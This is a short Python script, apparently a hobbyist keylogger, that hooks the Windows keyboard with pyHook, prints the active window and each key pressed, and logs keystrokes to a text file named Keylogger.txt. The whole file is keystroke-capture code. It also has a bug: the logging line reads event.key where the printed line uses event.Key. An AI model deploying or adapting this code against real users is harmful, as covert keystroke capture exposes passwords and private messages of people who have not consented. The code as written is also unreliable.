import pyHook, pythoncom, sys, logging, time,datetime

carpeta_destino = 'C:\\Users\\Luisd\\Desktop\\Keylogger.txt'

def OnkeyboardEvent(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
    print('WindowName:', event.WindowName)
    print('Window:',event.Window)
    print('key:', event.Key)
    logging.log(10, event.key)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnkeyboardEvent
hooks_manager.HookKeyboard()

while True:
    pythoncom.PumpWaitingMessages()
